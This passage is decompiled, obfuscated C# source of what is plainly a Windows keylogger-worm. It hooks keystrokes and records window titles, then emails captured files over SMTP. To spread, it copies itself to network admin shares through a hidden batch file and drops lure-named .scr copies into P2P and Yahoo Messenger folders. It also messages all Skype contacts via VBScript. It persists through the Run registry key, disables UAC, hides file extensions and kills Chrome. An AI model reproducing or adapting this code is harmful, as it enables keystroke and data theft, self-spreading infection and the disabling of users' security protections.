		while (int_1-- > 0)
		{
			class23_0.byte_0[class23_0.int_0++] = class23_0.byte_0[int_0++];
			class23_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_27()
	{
		try
		{
			Class15.smethod_70();
		}
		catch (Exception)
		{
		}
	}

	unsafe static int smethod_28(int int_0, int int_1, ref Form1.Class5.Struct0 struct0_0)
	{
		void* ptr = stackalloc byte[9];
		((byte*)ptr)[8] = ((int_0 == 0) ? ((byte)1) : ((byte)0));
		if (((byte*)ptr)[8] != 0)
		{
			*(int*)((byte*)ptr + 4) = int_1 - 256;
			switch (*(int*)((byte*)ptr + 4))
			{
			case 0:
			case 4:
			{
				Form1.Class5.Delegate1 delegate1_ = Form1.Class5.delegate1_0;
				((byte*)ptr)[8] = ((delegate1_ != null) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] != 0)
				{
					delegate1_((Keys)struct0_0.int_0);
				}
				break;
			}
			case 1:
			case 5:
			{
				Form1.Class5.Delegate2 delegate2_ = Form1.Class5.delegate2_0;
				((byte*)ptr)[8] = ((delegate2_ != null) ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[8] != 0)
				{
					delegate2_((Keys)struct0_0.int_0);
				}
				break;
			}
			}
		}
		*(int*)ptr = Class15.CallNextHookEx(Form1.Class5.int_0, int_0, int_1, struct0_0);
		return *(int*)ptr;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	static unsafe void smethod_29(Form1 form1_0)
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 144:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0026;
						case 4:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 5:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0026:
					*(int*)((byte*)ptr + 8) = 3;
					FileSystem.Kill(form1_0.vmethod_14().get_Text() + "\\*.png");
					break;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					form1_0.vmethod_24().set_Text(Environment.GetFolderPath(Environment.SpecialFolder.Templates));
					goto IL_0026;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 4;
				FileSystem.Kill(form1_0.vmethod_14().get_Text() + "\\*.txt");
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 144;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_30(Class19 class19_0)
	{
		class19_0.type_0.GetMethod("Clear")!.Invoke(class19_0.object_0, new object[0]);
	}

	unsafe static void smethod_31()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\winmx\\shared\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static int smethod_32(Class20.Class23 class23_0, Class20.Class22 class22_0, int int_0)
	{
		void* ptr = stackalloc byte[8];
		int_0 = Math.Min(Math.Min(int_0, 32768 - class23_0.int_1), Class15.smethod_51(class22_0));
		*(int*)((byte*)ptr + 4) = 32768 - class23_0.int_0;
		if (int_0 > *(int*)((byte*)ptr + 4))
		{
			*(int*)ptr = Class15.smethod_21(class22_0, class23_0.byte_0, class23_0.int_0, *(int*)((byte*)ptr + 4));
			if (*(int*)ptr == *(int*)((byte*)ptr + 4))
			{
				*(int*)ptr += Class15.smethod_21(class22_0, class23_0.byte_0, 0, int_0 - *(int*)((byte*)ptr + 4));
			}
		}
		else
		{
			*(int*)ptr = Class15.smethod_21(class22_0, class23_0.byte_0, class23_0.int_0, int_0);
		}
		class23_0.int_0 = (class23_0.int_0 + *(int*)ptr) & 0x7FFF;
		class23_0.int_1 += *(int*)ptr;
		return *(int*)ptr;
	}

	static void smethod_33(string string_0, Form1 form1_0, string string_1)
	{
		try
		{
			MailMessage mailMessage = new MailMessage();
			mailMessage.From = new MailAddress(form1_0.string_0[1]);
			mailMessage.To.Add(form1_0.string_0[1]);
			mailMessage.Subject = string_0;
			mailMessage.Body = string_1;
			Attachment item = new Attachment(form1_0.vmethod_30().get_Text());
			Attachment item2 = new Attachment(form1_0.vmethod_20().get_Text());
			mailMessage.Attachments.Add(item2);
			mailMessage.Attachments.Add(item);
			SmtpClient smtpClient = new SmtpClient(form1_0.string_0[3]);
			smtpClient.Port = Conversions.ToInteger(form1_0.string_0[4]);
			smtpClient.Credentials = new NetworkCredential(form1_0.string_0[1], form1_0.string_0[2]);
			smtpClient.EnableSsl = true;
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_34()
	{
		StreamWriter streamWriter = new StreamWriter("C:\\74yhq.bat");
		streamWriter.WriteLine("@echo off & break off");
		streamWriter.WriteLine("net view >log.txt");
		streamWriter.WriteLine("for /f %%t in (log.txt) do ( ");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\IPC$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\ADMIN$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\C$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\D$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\PRINT$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\e$\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\e$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\d$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" %%t\\C$\\shared\\debug.exe");
		streamWriter.WriteLine("copy \"" + Class7.string_0 + "\" shared\\debug.exe");
		streamWriter.WriteLine(")");
		streamWriter.Close();
		Process process = new Process();
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.FileName = "C:\\74yhq.bat";
		process.Start();
	}

	unsafe static void smethod_35()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\bearshare\\shared\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetKeyState(long long_0);

	static void smethod_36()
	{
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().get_CurrentUser().OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Application.get_ProductName(), Application.get_ExecutablePath());
			File.SetAttributes(Path.GetTempPath() + "desktop.ini", FileAttributes.Hidden);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object)"2");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object)"1");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", (object)"0");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Identities\\Software\\Microsoft\\Outlook Express\\5.0\\signatures", "Default Signature", (object)"C:\\windows\\sp.htm");
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			((ServerComputer)Class1.smethod_0()).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Patchou\\Messenger Plus! Live\\GlobalSettings\\Scripts\\MSN PLUS", "background", (object)"C:\\windows\\sp.htm");
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_37(Class20.Class22 class22_0, int int_0)
	{
		class22_0.uint_0 >>= int_0;
		class22_0.int_2 -= int_0;
	}

	unsafe static void smethod_38(Form1 form1_0)
	{
		void* ptr = stackalloc byte[21];
		int try0006_dispatch = -1;
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					int int_;
					switch (try0006_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						*unchecked((int*)((byte*)ptr + 4)) = -2;
						goto IL_0011;
					case 250:
						{
							unchecked
							{
								*(int*)((byte*)ptr + 8) = *(int*)((byte*)ptr + 12);
								if (*(int*)((byte*)ptr + 4) > -2)
								{
									switch (*(int*)((byte*)ptr + 4))
									{
									case 1:
										break;
									default:
										goto end_IL_0006;
									}
								}
								int num = *(int*)((byte*)ptr + 8) + 1;
								*(int*)((byte*)ptr + 8) = 0;
								switch (num)
								{
								case 1:
									break;
								case 2:
									goto IL_0011;
								case 3:
									goto IL_003e;
								case 5:
								case 6:
									goto IL_005c;
								case 7:
									goto IL_007d;
								case 4:
								case 8:
								case 9:
								case 10:
								case 11:
									goto IL_0095;
								default:
									goto end_IL_0006;
								case 12:
									goto end_IL_0006_2;
								}
								goto default;
							}
						}
						IL_0095:
						*unchecked((int*)((byte*)ptr + 12)) = 11;
						form1_0.int_0++;
						goto IL_002a;
						IL_007d:
						*unchecked((int*)((byte*)ptr + 12)) = 7;
						form1_0.process_0[form1_0.int_0].Kill();
						goto IL_0095;
						IL_0011:
						*unchecked((int*)((byte*)ptr + 12)) = 2;
						*unchecked((int*)ptr) = form1_0.process_0.Length - 1;
						form1_0.int_0 = 0;
						goto IL_002a;
						IL_002a:
						int_ = form1_0.int_0;
						*unchecked((int*)((byte*)ptr + 16)) = *unchecked((int*)ptr);
						if (int_ > *unchecked((int*)((byte*)ptr + 16)))
						{
							goto end_IL_0006_2;
						}
						goto IL_003e;
						IL_003e:
						*unchecked((int*)((byte*)ptr + 12)) = 3;
						text = Strings.LCase(form1_0.process_0[form1_0.int_0].ProcessName);
						goto IL_005c;
						IL_005c:
						*unchecked((int*)((byte*)ptr + 12)) = 6;
						unchecked((byte*)ptr)[20] = ((Operators.CompareString(text, "chrome", false) == 0) ? ((byte)1) : ((byte)0));
						if (unchecked((byte*)ptr)[20] != 0)
						{
							goto IL_007d;
						}
						goto IL_0095;
						end_IL_0006:
						break;
					}
				}
			}
			catch (object obj) when ((obj is Exception) & (*(int*)((byte*)ptr + 4) != 0) & (*(int*)((byte*)ptr + 8) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 250;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_2:
			break;
		}
		if (*(int*)((byte*)ptr + 8) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	unsafe static void smethod_39()
	{
		void* ptr = stackalloc byte[38];
		try
		{
			string text = "C:\\Documents and Settings\\" + Environment.UserName + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
			string text2 = "C:\\Documents and Settings\\" + Environment.MachineName + "\\Local Settings\\Application Data\\Yahoo Messenger\\";
			*(int*)((byte*)ptr + 24) = 0;
			*(long*)ptr = 0L;
			string[] array = null;
			array = Directory.GetDirectories(text);
			byte* num = (byte*)ptr + 24;
			*(int*)((byte*)ptr + 28) = array.GetUpperBound(0);
			*(int*)num = 0;
			while (true)
			{
				int num2 = *(int*)((byte*)ptr + 24);
				*(int*)((byte*)ptr + 32) = *(int*)((byte*)ptr + 28);
				if (num2 > *(int*)((byte*)ptr + 32))
				{
					break;
				}
				((byte*)ptr)[36] = 1;
				if (((byte*)ptr)[36] != 0)
				{
					((byte*)ptr)[37] = 1;
					if (((byte*)ptr)[37] != 0)
					{
						File.Copy(Class7.string_0, text + "\\myhotpics.scr");
						File.Copy(Class7.string_0, text2 + "\\myhotpics.scr");
						File.Copy(Class7.string_0, text + "\\18pluspics.scr");
						File.Copy(Class7.string_0, text2 + "\\hotnastypics.scr");
						File.Copy(Class7.string_0, text + "\\myexpics.scr");
						File.Copy(Class7.string_0, text2 + "\\mygfspics.scr");
						File.Copy(Class7.string_0, text + "\\girlfirendspic.scr");
						File.Copy(Class7.string_0, text2 + "\\freepussys.scr");
						File.Copy(Class7.string_0, text + "\\hotgirltowank.scr");
						File.Copy(Class7.string_0, text2 + "\\hotgirlshere.scr");
						File.Copy(Class7.string_0, text + "\\freesex.scr");
						File.Copy(Class7.string_0, text2 + "\\freehotporn.scr");
						File.Copy(Class7.string_0, text2 + "\\brazzersaccounts.scr");
						File.Copy(Class7.string_0, text2 + "\\freebrazzers.scr");
						File.Copy(Class7.string_0, text2 + "\\freerealitykings.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2hack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiahack.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2wallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockwallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiawallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2speedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockspeedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiaspeedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiaspeedhack.scr");
					}
					*(long*)((byte*)ptr + 8) = array.GetUpperBound(0);
					*(long*)ptr = 0L;
					while (true)
					{
						long num3 = *(long*)ptr;
						*(long*)((byte*)ptr + 16) = *(long*)((byte*)ptr + 8);
						if (num3 > *(long*)((byte*)ptr + 16))
						{
							break;
						}
						File.Copy(Class7.string_0, text + "\\myhotpics.scr");
						File.Copy(Class7.string_0, text2 + "\\myhotpics.scr");
						File.Copy(Class7.string_0, text + "\\18pluspics.scr");
						File.Copy(Class7.string_0, text2 + "\\hotnastypics.scr");
						File.Copy(Class7.string_0, text + "\\myexpics.scr");
						File.Copy(Class7.string_0, text2 + "\\mygfspics.scr");
						File.Copy(Class7.string_0, text + "\\girlfirendspic.scr");
						File.Copy(Class7.string_0, text2 + "\\freepussys.scr");
						File.Copy(Class7.string_0, text + "\\hotgirltowank.scr");
						File.Copy(Class7.string_0, text2 + "\\hotgirlshere.scr");
						File.Copy(Class7.string_0, text + "\\freesex.scr");
						File.Copy(Class7.string_0, text2 + "\\freehotporn.scr");
						File.Copy(Class7.string_0, text2 + "\\brazzersaccounts.scr");
						File.Copy(Class7.string_0, text2 + "\\freebrazzers.scr");
						File.Copy(Class7.string_0, text2 + "\\freerealitykings.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2hack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiahack.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2wallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockwallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiawallhack.scr");
						File.Copy(Class7.string_0, text2 + "\\mw2speedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\warrockspeedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiaspeedhack.scr");
						File.Copy(Class7.string_0, text2 + "\\tibiaspeedhack.scr");
						checked
						{
							(*unchecked((long*)ptr))++;
						}
					}
				}
				checked
				{
					(*unchecked((int*)((byte*)ptr + 24)))++;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static short smethod_40(int int_0)
	{
		return (short)((Class20.Class26.byte_0[int_0 & 0xF] << 12) | (Class20.Class26.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class20.Class26.byte_0[(int_0 >> 8) & 0xF] << 4) | Class20.Class26.byte_0[int_0 >> 12]);
	}

	unsafe static int smethod_41(int int_0, Class20.Class21 class21_0, int int_1, byte[] byte_0)
	{
		void* ptr = stackalloc byte[8];
		*(int*)ptr = 0;
		do
		{
			if (class21_0.int_4 != 11)
			{
				*(int*)((byte*)ptr + 4) = Class15.smethod_61(int_0, byte_0, int_1, class21_0.class23_0);
				int_0 += *(int*)((byte*)ptr + 4);
				*(int*)ptr += *(int*)((byte*)ptr + 4);
				int_1 -= *(int*)((byte*)ptr + 4);
				if (int_1 == 0)
				{
					return *(int*)ptr;
				}
			}
		}
		while (Class15.smethod_67(class21_0) || (class21_0.class23_0.int_1 > 0 && class21_0.int_4 != 11));
		return *(int*)ptr;
	}

	unsafe static void smethod_42()
	{
		void* ptr = stackalloc byte[5];
		Process[] processes = Process.GetProcesses();
		*(int*)ptr = 0;
		while (true)
		{
			((byte*)ptr)[4] = ((*(int*)ptr < processes.Length) ? ((byte)1) : ((byte)0));
			if (((byte*)ptr)[4] != 0)
			{
				Process process = processes[*(int*)ptr];
				((byte*)ptr)[4] = (process.ProcessName.ToLower().Contains("skype") ? ((byte)1) : ((byte)0));
				if (((byte*)ptr)[4] != 0)
				{
					StreamWriter streamWriter = new StreamWriter("C:\\rpg7.vbs");
					streamWriter.WriteLine("on error resume next");
					streamWriter.WriteLine("set Fruxr = WScript.CreateObject(Skype4COM.Skype, Skype_)");
					streamWriter.WriteLine("Fruxr.Client.Start()");
					streamWriter.WriteLine("Fruxr.Attach(\"" + Class7.string_0 + "\")");
					streamWriter.WriteLine("For Each KZN In Fruxr.Friends");
					streamWriter.WriteLine("Fruxr.Sendsaythis KZN.handle,lolmehot");
					streamWriter.WriteLine("next");
					streamWriter.Close();
					Process process2 = new Process();
					process2.StartInfo.FileName = "C:\\rpg7.vbs";
					process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process2.Start();
				}
				checked
				{
					(*unchecked((int*)ptr))++;
					continue;
				}
			}
			break;
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetWindowTextA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1);

	unsafe static bool smethod_43(Class20.Class25 class25_0, Class20.Class22 class22_0)
	{
		void* ptr = stackalloc byte[8];
		while (true)
		{
			switch (class25_0.int_2)
			{
			case 5:
			{
				*(int*)((byte*)ptr + 4) = Class20.Class25.int_1[class25_0.int_7];
				int num = Class15.smethod_1(class22_0, *(int*)((byte*)ptr + 4));
				if (num >= 0)
				{
					Class15.smethod_37(class22_0, *(int*)((byte*)ptr + 4));
					num += Class20.Class25.int_0[class25_0.int_7];
					while (num-- > 0)
					{
						class25_0.byte_1[class25_0.int_8++] = class25_0.byte_2;
					}
					if (class25_0.int_8 == class25_0.int_6)
					{
						return true;
					}
					goto IL_0080;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class15.smethod_7(class25_0.class24_0, class22_0)) & -16) == 0)
				{
					class25_0.byte_1[class25_0.int_8++] = (class25_0.byte_2 = (byte)num2);
					if (class25_0.int_8 == class25_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class25_0.byte_2 = 0;
					}
					class25_0.int_7 = num2 - 16;
					class25_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class25_0.int_8 < class25_0.int_5)
				{
					*(int*)ptr = Class15.smethod_1(class22_0, 3);
					if (*(int*)ptr >= 0)
					{
						Class15.smethod_37(class22_0, 3);
						class25_0.byte_0[Class20.Class25.int_9[class25_0.int_8]] = (byte)(*(uint*)ptr);
						class25_0.int_8++;
						continue;
					}
					return false;
				}
				class25_0.class24_0 = new Class20.Class24(class25_0.byte_0);
				class25_0.byte_0 = null;
				class25_0.int_8 = 0;
				class25_0.int_2 = 4;
				goto case 4;
			case 2:
				class25_0.int_5 = Class15.smethod_1(class22_0, 4);
				if (class25_0.int_5 >= 0)
				{
					class25_0.int_5 += 4;
					Class15.smethod_37(class22_0, 4);
					class25_0.byte_0 = new byte[19];
					class25_0.int_8 = 0;
					class25_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class25_0.int_4 = Class15.smethod_1(class22_0, 5);
				if (class25_0.int_4 >= 0)
				{
					class25_0.int_4++;
					Class15.smethod_37(class22_0, 5);
					class25_0.int_6 = class25_0.int_3 + class25_0.int_4;
					class25_0.byte_1 = new byte[class25_0.int_6];
					class25_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class25_0.int_3 = Class15.smethod_1(class22_0, 5);
				if (class25_0.int_3 >= 0)
				{
					class25_0.int_3 += 257;
					Class15.smethod_37(class22_0, 5);
					class25_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_0080:
			class25_0.int_2 = 4;
		}
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int GetAsyncKeyState(long long_0);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	static extern int SetWindowsHookExA(int int_0, Form1.Class5.Delegate0 delegate0_0, int int_1, int int_2);

	static int smethod_44(Class20.Stream0 stream0_0)
	{
		return Class15.smethod_66(stream0_0) | (Class15.smethod_66(stream0_0) << 16);
	}

	static string smethod_45(Form1 form1_0)
	{
		string string_ = new string('\0', 100);
		Class15.GetWindowTextA(Class15.GetForegroundWindow(), ref string_, 100);
		return string_.Substring(0, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
	}

	unsafe static void smethod_46()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
						goto default;
					}
					IL_0044:
					*(int*)((byte*)ptr + 8) = 5;
					Class15.smethod_52(string_, Class7.string_3);
					break;
					IL_0034:
					*(int*)((byte*)ptr + 8) = 4;
					Class15.smethod_52(string_, Class7.string_2);
					goto IL_0044;
					IL_000f:
					*(int*)((byte*)ptr + 8) = 2;
					string_ = Class7.string_5 + "\\morpheus\\my shared folder\\";
					goto IL_0024;
					IL_0024:
					*(int*)((byte*)ptr + 8) = 3;
					Class15.smethod_52(string_, Class7.string_1);
					goto IL_0034;
					end_IL_0006_2:
					break;
				}
				*(int*)((byte*)ptr + 8) = 6;
				Class15.smethod_52(string_, Class7.string_4);
				break;
				end_IL_0006:;
			}
			catch (object obj) when ((obj is Exception) & (*(int*)ptr != 0) & (*(int*)((byte*)ptr + 4) == 0))
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 155;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (*(int*)((byte*)ptr + 4) != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Auto)]
	static extern int GetShortPathName([MarshalAs(UnmanagedType.LPTStr)] string string_0, [MarshalAs(UnmanagedType.LPTStr)] StringBuilder stringBuilder_0, int int_0);

	unsafe static void smethod_47()
	{
		void* ptr = stackalloc byte[12];
		int try0006_dispatch = -1;
		string string_ = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0006_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					*(int*)ptr = -2;
					goto IL_000f;
				case 155:
					{
						*(int*)((byte*)ptr + 4) = *(int*)((byte*)ptr + 8);
						if (*(int*)ptr > -2)
						{
							switch (*(int*)ptr)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num = *(int*)((byte*)ptr + 4) + 1;
						*(int*)((byte*)ptr + 4) = 0;
						switch (num)
						{
						case 1:
							break;
						case 2:
							goto IL_000f;
						case 3:
							goto IL_0024;
						case 4:
							goto IL_0034;
						case 5:
							goto IL_0044;
						case 6:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 7:
							goto end_IL_0006_3;
						}
